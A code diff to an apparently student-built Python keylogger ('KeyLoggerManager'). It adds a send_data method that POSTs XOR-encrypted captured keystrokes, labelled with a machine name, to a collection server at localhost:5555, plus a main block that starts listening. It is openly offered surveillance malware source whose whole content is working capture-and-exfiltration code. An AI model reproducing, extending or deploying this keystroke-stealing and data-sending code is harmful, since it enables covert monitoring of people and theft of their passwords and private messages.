@@ -1,8 +1,8 @@
 import time
 from KeyloggerService import KeyLoggerService
 from Encryption import XOREncryption
-from KeyloggerAgent.Write import FileWriter
-
+from Write import FileWriter
+import requests
 
 
 
@@ -24,7 +24,19 @@ class KeyLoggerManager:
             time.sleep(5)
             data = self.service.get_data()
             self._write_to_file(self.encrypt(data),'log.json')
+            encrypted_data=self.encrypt(data)
+            self.send_data(encrypted_data)
 
+    def send_data(self, data: dict):
+        try:
+            response = requests.post(
+                "http://localhost:5555/home", 
+                json={"machine_name": "Test Machine", "data": data},
+                headers={'Content-Type': 'application/json'}
+            )
+            
+        except Exception as e:
+            print(f" שגיאה בשליחת הנתונים: {e}")
     def stop_listening(self):
         """
          Stops listening to keyboard keys
@@ -63,6 +75,8 @@ class KeyLoggerManager:
         """
         self.writer.write(data ,file_name)
 
-
+if __name__ == "__main__":
+    keylogger = KeyLoggerManager()
+    keylogger.start_listening()
 
 
